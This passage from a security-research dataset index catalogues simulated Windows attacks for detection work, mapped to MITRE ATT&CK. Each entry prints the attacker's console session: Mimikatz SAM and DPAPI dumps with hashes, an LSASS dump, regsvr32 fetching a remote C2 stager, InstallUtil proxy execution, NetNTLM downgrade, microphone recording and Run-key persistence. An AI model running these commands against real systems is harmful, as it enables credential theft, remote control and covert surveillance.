CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )\n        Exportable key : YES\n        Private export : OK - 'ntds_capi_0_a0feda20-878f-4e68-ba74-d4df8f0191ab.keyx.rsa.pvk'\n        PFX container  : OK - 'ntds_capi_0_a0feda20-878f-4e68-ba74-d4df8f0191ab.pfx'\n        Export         : OK - 'ntds_capi_0_a0feda20-878f-4e68-ba74-d4df8f0191ab.der'\n\nCompatibility prefered key: {0343c16b-26f1-4e2c-83ed-90e443b3bfca}\n  * Legacy key\ndaef8bf857ba653c7c233a1156d0fb3c488487caf7b0cb1879f6f6fd4dc3877d\n4ad77077efd018b07267585828f1e3a7e88abd203ca86d820bcd1f1f806426e2\n71834ddd67073b1e581379be55a6dd97fecee5ff9cda881936209f35653a681e\n444aedb87d2bef790e4b25084c4395372f358e226893731f621eb3f0f99153ab\n9af4c25dd32010ffe1bcac8b7ba10c6163d97b85ee19653356624068b8f01476\n77cb393bbf0fd4369a8a6982545aa2a81b70132b636218bdb9a7b7f7149d361c\n45236e528672ec9defd57430cdc0264ad6d51669715d83be2b059ec162607603\n834960f44601d4a2a02d901d67f7046b81adf702b48f8420598dd8e81fe8b1bc\n\n        Export         : OK - 'ntds_legacy_0_0343c16b-26f1-4e2c-83ed-90e443b3bfca.key'\n(Empire: powershell/credentials/mimikatz/command) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:33.636296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190519005224.yaml": {
        "title": "Empire Remote Get Session",
        "id": "SDWIN-190519005224",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/19",
        "modification_date": "2019/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC NetSessEnum",
            "SMB Srvsvc"
        ],
        "description": "This dataset represents adversaries leveraging RPC SRVSVC and the method NetSessEnum over SMB to query remote hosts for active sessions",
        "attack_mappings": [
            {
                "technique": "T1049",
                "sub-technique": null,
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_getsession_dcerpc_smb_srvsvc_NetSessEnum.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/network/empire_getsession_dcerpc_smb_srvsvc_NetSessEnum.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "get_session",
                    "script": "https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/situational_awareness/network/powerview.ps1"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: WE8XYD3K) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nWE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 07:44:38  http            \n\n(Empire: agents) > interact WE8XYD3K\n(Empire: WE8XYD3K) > usemodule situational_awareness/network/powerview/get_session\n(Empire: powershell/situational_awareness/network/powerview/get_session) > info\n\n              Name: Get-NetSession\n            Module: powershell/situational_awareness/network/powerview/get_session\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Execute the NetSessionEnum Win32API call to query a given\n  host for active sessions on the host. Part of PowerView.\n\nComments:\n  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Reco\n  n/\n\nOptions:\n\n  Name         Required    Value                     Description\n  ----         --------    -------                   -----------\n  Agent        True        WE8XYD3K                  Agent to run module on.                 \n  ComputerName False       localhost                 The hostname or IP to query for local   \n                                                    group users.                            \n\n(Empire: powershell/situational_awareness/network/powerview/get_session) > set ComputerName MORDORDC\n(Empire: powershell/situational_awareness/network/powerview/get_session) > execute\n[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n[*] Agent WE8XYD3K tasked with task ID 2\n[*] Tasked agent WE8XYD3K to run module powershell/situational_awareness/network/powerview/get_session\n(Empire: powershell/situational_awareness/network/powerview/get_session) > \nJob started: DV248X\n\nCName         UserName Time IdleTime ComputerName\n-----         -------- ---- -------- ------------\n\\\\172.18.39.5 pgustavo    0        0 MORDORDC    \n\nGet-NetSession completed!\n\n(Empire: powershell/situational_awareness/network/powerview/get_session) > "
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:33.819297+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190625103712.yaml": {
        "title": "Empire Mimikatz SAM Extract Hashes",
        "id": "SDWIN-190625103712",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/06/25",
        "modification_date": "2019/09/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Calculating SysKey",
            "SAM Read",
            "SAM Handle Request"
        ],
        "description": "This dataset represents adversaries calculating the SysKey to decrypt Security Account Mannager (SAM) database entries (from registry or hive) and get NTLM, and sometimes LM hashes of local accounts password.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "002",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_sam_access.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "mimikatz_sam",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: WE8XYD3K) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nWE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 08:05:18  http            \n\n(Empire: agents) > interact WE8XYD3K\n(Empire: WE8XYD3K) > usemodule credentials/mimikatz/sam*\n(Empire: powershell/credentials/mimikatz/sam) > info\n\n              Name: Invoke-Mimikatz SAM dump\n            Module: powershell/credentials/mimikatz/sam\n        NeedsAdmin: True\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @JosephBialek\n  @gentilkiwi\n\nDescription:\n  Runs PowerSploit's Invoke-Mimikatz function to extract\n  hashes from the Security Account Managers (SAM) database.\n\nComments:\n  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt\n  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls\n  a\n\nOptions:\n\n  Name  Required    Value                     Description\n  ----  --------    -------                   -----------\n  Agent True        WE8XYD3K                  Agent to run module on.                 \n\n(Empire: powershell/credentials/mimikatz/sam) > execute\n[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n[*] Agent WE8XYD3K tasked with task ID 3\n[*] Tasked agent WE8XYD3K to run module powershell/credentials/mimikatz/sam\n(Empire: powershell/credentials/mimikatz/sam) > \nJob started: Z4KLXY\n\nHostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # token::elevate\nToken Id  : 0\nUser name : \nSID name  : NT AUTHORITY\\SYSTEM\n\n696     {0;000003e7} 1 D 27257          NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Primary\n-> Impersonated !\n* Process Token : {0;0010a7df} 2 F 10859624    THESHIRE\\pgustavo       S-1-5-21-4228717743-1032521047-1810997296-1104  (17g,24p)       Primary\n* Thread Token  : {0;000003e7} 1 D 12272014    NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)\n\nmimikatz(powershell) # lsadump::sam\nDomain : WORKSTATION5\nSysKey : 8e84403d1d0dcb7cac8f92c438143741\nLocal SID : S-1-5-21-2579707521-1384412784-3942915809\n\nSAMKey : 506df337a2681cb7e4c265d30250d55d\n\nRID  : 000001f4 (500)\nUser : wardog\n  Hash NTLM: 42ddb2963bbe8f1c075fc869d3bce33e\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 85c5e007a00c6fb1c5adf026cf9dd42f\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : WORKSTATION5Administrator\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : d24867d975ac3fead7e604bc793bc32c42e4f599d0fd871cebca72444a9475a8\n      aes128_hmac       (4096) : d22a564882d258731c02684449a62b3c\n      des_cbc_md5       (4096) : ae58aed5d5cef143\n    OldCredentials\n      aes256_hmac       (4096) : e104dc2412faf5a1e65d1c10218130aa1d2d70d64bd103e36c6115d9f84c36c9\n      aes128_hmac       (4096) : eff1bddad41de0a68408261d362d1ad3\n      des_cbc_md5       (4096) : 15a8dc46a16e62bf\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:Kerberos *\n    Default Salt : WORKSTATION5Administrator\n    Credentials\n      des_cbc_md5       : ae58aed5d5cef143\n    OldCredentials\n      des_cbc_md5       : 15a8dc46a16e62bf\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n\nmimikatz(powershell) # token::revert\n* Process Token : {0;0010a7df} 2 F 10859624    THESHIRE\\pgustavo       S-1-5-21-4228717743-1032521047-1810997296-1104  (17g,24p)       Primary\n* Thread Token  : no token\n\n(Empire: powershell/credentials/mimikatz/sam) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:34.009296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190625133822.yaml": {
        "title": "Empire Reg Dump SAM Hive",
        "id": "SDWIN-190625133822",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/06/25",
        "modification_date": "2019/06/25",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "SAM Rquest Handle"
        ],
        "description": "This dataset represents adversaries with administrator privileges using the windows reg utility to dump the SAM registry hive.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "002",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_reg_dump_sam.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "Interactive Session",
                    "name": "Remote Desktop Protocol",
                    "module": null,
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: WE8XYD3K) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nWE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 08:27:49  http            \n\n(Empire: agents) > interact WE8XYD3K\n(Empire: WE8XYD3K) > shell reg save HKLM\\sam sam\n[*] Tasked WE8XYD3K to run TASK_SHELL\n[*] Agent WE8XYD3K tasked with task ID 5\n(Empire: WE8XYD3K) > \nThe operation completed successfully.\n\n..Command execution completed.\n\n(Empire: WE8XYD3K) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:34.188296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-191027055035.yaml": {
        "title": "RDP TaskManager LSASS Dump",
        "id": "SDWIN-191027055035",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/10/27",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RDP Interactive"
        ],
        "description": "This dataset represents adversaries using RDP and task manager interactively and dump the memory space of lsass.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "001",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Remote Interactive Task Manager LSASS Dump",
                "link": "https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-191030201010.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/rdp_interactive_taskmanager_lsass_dump.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "Interactive Session",
                    "name": "RDP",
                    "module": null,
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "RDP to victim\nOpen Windows Task Manager as Administrator\nSelect lsass.exe\nRight-click on lsass.exe and select \u201cCreate dump file\u201d"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:34.383296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-191027223020.yaml": {
        "title": "Covenant ShellCmd InstallUtil",
        "id": "SDWIN-191027223020",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/10/27",
        "modification_date": "2020/09/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "InstallUtil",
            "LOLBin"
        ],
        "description": "This dataset represents adversaries proxy executing code through InstallUtil, a trusted Windows utility.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "004",
                "tactics": [
                    "TA0005",
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/covenant_installutil.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "ShellCmd",
                    "script": "https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "Upload Task: GruntHTTP.dll -> C:\\ProgramData\\GruntHTTP.dll\n(wardog) > ShellCmd /shellcommand:\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u c:\\ProgramData\\GruntHTTP.dll\""
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:34.558296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-191225045202.yaml": {
        "title": "Empire Invoke InternalMonologue",
        "id": "SDWIN-191225045202",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/12/25",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Registry Modification",
            "Windows Registry NetNTLM settings",
            "Downgrade"
        ],
        "description": "This dataset represents adversaries downgrading the challenge/response authentication protocol used for network logons, the minimum security negotiated for applications using NTLMSSP, and security settings that restrict outgoing NTLM traffic to remote servers in an environment",
        "attack_mappings": [
            {
                "technique": "T1112",
                "sub-technique": null,
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Extended NetNTLM Downgrade",
                "link": "https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-191224222300.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "invoke_internal_monologue",
                    "script": "https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-InternalMonologue.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: XFLEZM9N) > usemodule credentials/invoke_internal_monologue*\n(Empire: powershell/credentials/invoke_internal_monologue) > info\n\n            Name: Invoke-InternalMonologue\n            Module: powershell/credentials/invoke_internal_monologue\n        NeedsAdmin: True\n        OpsecSafe: False\n        Language: powershell\nMinLanguageVersion: 2\n        Background: False\nOutputExtension: None\n\nAuthors:\n@eladshamir\n@4lex\n\nDescription:\nUses the Internal Monologue attack to force easily-\ndecryptable Net-NTLMv1 responses over localhost and without\ndirectly touching LSASS.\nhttps://github.com/eladshamir/Internal-Monologue\n\nComments:\nThe underlying powershell function accepts switches that\n[DISABLE] default behaviours. The default settings will\ndowngrade NetNTLM responses to v1, impersonate all users,\nuse challenge 1122334455667788 and restore the registry to\nits original state. Set the options in this module to True\nin order to DISABLE the behaviours Disabling Downgrade and\nImpersonation yields higher OPSEC, but less than ideal loot\n\nOptions:\n\nName        Required    Value                     Description\n----        --------    -------                   -----------\nAgent       True        XFLEZM9N                  Agent to use for InternalMonologue      \nChallenge   True        1122334455667788          Net-NTLM Challenge to send              \nDowngrade   False                                 DISABLE downgrading to allow Net-NTLMv1 \n                                                    responses                               \nImpersonate False                                 DISABLE user impersonation and fetch    \n                                                    only current user                       \nRestore     False                                 DISABLE restoring the registry setting  \n                                                    that allowed v1 responses               \nVerbose     False                                 Verbose                                 \n\n(Empire: powershell/credentials/invoke_internal_monologue) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked XFLEZM9N to run TASK_CMD_WAIT\n[*] Agent XFLEZM9N tasked with task ID 2\n[*] Tasked agent XFLEZM9N to run module powershell/credentials/invoke_internal_monologue\n(Empire: powershell/credentials/invoke_internal_monologue) > pgustavo::shire:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:1122334455667788\nIT001$::shire:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:1122334455667788"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:34.740296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200609225055.yaml": {
        "title": "MSF Record Mic",
        "id": "SDWIN-200609225055",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/06/09",
        "modification_date": "2020/06/09",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Microphone Access"
        ],
        "description": "This dataset represents adversaries accessing the microphone of an endpoint.",
        "attack_mappings": [
            {
                "technique": "T1123",
                "sub-technique": null,
                "tactics": [
                    "TA0009"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Processes Accessing the Microphone Device",
                "link": "https://threathunterplaybook.com/notebooks/windows/09_collection/WIN-200609225055.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/collection/host/msf_record_mic.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Metasploit",
                    "module": "post",
                    "script": "https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "msf5 exploit(multi/handler) > use post/multi/manage/record_mic\nmsf5 post(multi/manage/record_mic) > set SESSION 2\nSESSION => 2\nmsf5 post(multi/manage/record_mic) > info\n\n      Name: Multi Manage Record Microphone\n    Module: post/multi/manage/record_mic\n  Platform: Linux, OSX, Windows\n      Arch: \n      Rank: Normal\n\nProvided by:\n  sinn3r <sinn3r@metasploit.com>\n\nCompatible session types:\n  Meterpreter\n\nBasic options:\n  Name      Current Setting  Required  Description\n  ----      ---------------  --------  -----------\n  DURATION  5                no        Number of seconds to record\n  SESSION   2                yes       The session to run this module on.\n\nDescription:\n  This module will enable and record your target's microphone. For \n  non-Windows targets, please use Java meterpreter to be able to use \n  this feature.\n\nmsf5 post(multi/manage/record_mic) > run\n\n[*] 172.18.39.6 - 20%...\n[*] 172.18.39.6 - 40%...\n[*] 172.18.39.6 - 60%...\n[*] 172.18.39.6 - 80%...\n[*] 172.18.39.6 - 100%...\n[*] 172.18.39.6 - Audio size: (55169 bytes)\n[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav\n[*] Post module execution completed\nmsf5 post(multi/manage/record_mic) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:34.918563+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200721232741.yaml": {
        "title": "Empire Regsvr32 Execution",
        "id": "SDWIN-200721232741",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/07/21",
        "modification_date": "2020/07/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Regsvr32 Execution"
        ],
        "description": "This dataset represents threat actors leveraging regsvr32 to proxy the execution of an empire payload (.sct file) to create a reverse connection to the C2.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "010",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_launcher_sct_regsvr32.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "launcher",
                    "script": "https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_sct.py"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Threat Actor View:\n(Empire) > usestager windows/launcher_sct\n(Empire: stager/windows/launcher_sct) > info\n\nName: regsvr32\n\nDescription:\n  Generates an sct file (COM Scriptlet) Host this\n  anywhere\n\nOptions:\n\n  Name             Required    Value             Description\n  ----             --------    -------           -----------\n  Listener         True                          Listener to generate stager for.\n  Language         True        powershell        Language of the stager to generate.\n  StagerRetries    False       0                 Times for the stager to retry\n                                                connecting.\n  Base64           True        True              Switch. Base64 encode the output.\n  Obfuscate        False       False             Switch. Obfuscate the launcher\n                                                powershell code, uses the\n                                                ObfuscateCommand for obfuscation types.\n                                                For powershell only.\n  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n                                                Only used if Obfuscate switch is True.\n                                                For powershell only.\n  OutFile          False       /tmp/launcher.sct File to output SCT to, otherwise\n                                                displayed on the screen.\n  UserAgent        False       default           User-agent string to use for the staging\n                                                request (default, none, or other).\n  Proxy            False       default           Proxy to use for request (default, none,\n                                                or other).\n  ProxyCreds       False       default           Proxy credentials\n                                                ([domain\\]username:password) to use for\n                                                request (default, none, or other).\n\n\n(Empire: stager/windows/launcher_sct) > set Listener http\n(Empire: stager/windows/launcher_sct) > execute\n\n[*] Stager output written out to: /tmp/launcher.sct\n\nVictim's PC\n\nPS C:\\Windows\\System32> .\\regsvr32.exe /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll\n\nThreat Actor View:\n\n(Empire: stager/windows/launcher_sct) > back\n(Empire) > \nEmpire: agents) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent 712ETU3B checked in\n[+] Initial agent 712ETU3B from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to 712ETU3B at 172.18.39.5\n\n(Empire: agents) > \n(Empire: agents) > \n(Empire: agents) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\\pgustavo        powershell         9076   5/0.0    2020-07-22 03:29:27  http            \n\n(Empire: agents) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:35.105565+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200722001847.yaml": {
        "title": "Empire Elevated Registry Run Keys",
        "id": "SDWIN-200722001847",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/07/22",
        "modification_date": "2020/09/04",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local Registry Modification",
            "Registry Run Keys"
        ],
        "description": "This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism.",
        "attack_mappings": [
            {
                "technique": "T1547",
                "sub-technique": "001",
                "tactics": [
                    "TA0003"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_persistence_registry_modification_run_keys_elevated_user.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "elevated_registry",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: 712ETU3B) > agents\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\\pgustavo        powershell         9076   5/0.0    2020-07-22 04:06:31  http            \n\n(Empire: agents) > \n(Empire: agents) > interact 712ETU3B\n(Empire: 712ETU3B) > \n(Empire: 712ETU3B) > usemodule persistence/elevated/registry*\n\n(Empire: 712ETU3B) > usemodule persistence/elevated/registry*\n(Empire: powershell/persistence/elevated/registry) > info\n\n              Name: Invoke-Registry\n            Module: powershell/persistence/elevated/registry\n        NeedsAdmin: True\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @mattifestation\n  @harmj0y\n\nDescription:\n  Persist a stager (or script) via the\n  HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry\n  key. This has an easy detection/removal rating.\n\nComments:\n  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n  rsistence/Persistence.psm1\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        712ETU3B                  Agent to run module on.                 \n  Listener         False                                 Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  KeyName          True        Updater                   Key name for the run trigger.           \n  RegPath          False       HKLM:SOFTWARE\\Microsoft\\  Registry location to store the script   \n                              Windows\\CurrentVersion\\D  code. Last element is the key name.     \n                              ebug                    \n  ADSPath          False                                 Alternate-data-stream location to store \n                                                        the script code.                        \n  ExtFile          False                                 Use an external file for the payload    \n                                                        instead of a stager.                    \n  Cleanup          False                                 Switch. Cleanup the trigger and any     \n                                                        script from specified location.         \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/persistence/elevated/registry) > set Listener http\n(Empire: powershell/persistence/elevated/registry) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked 712ETU3B to run TASK_CMD_WAIT\n[*] Agent 712ETU3B tasked with task ID 7\n[*] Tasked agent 712ETU3B to run module powershell/persistence/elevated/registry\n(Empire: powershell/persistence/elevated/registry) > \nRegistry persistence established using listener http stored in HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug.\n\n(Empire: powershell/persistence/elevated/registry) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:35.276232+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200724174200.yaml": {
        "title": "Covenant Remote WMI Eventing ActiveScriptEventConsumers",
        "id": "SDWIN-200724174200",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/07/24",
        "modification_date": "2020/07/24",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Remote WMI Eventing"
        ],
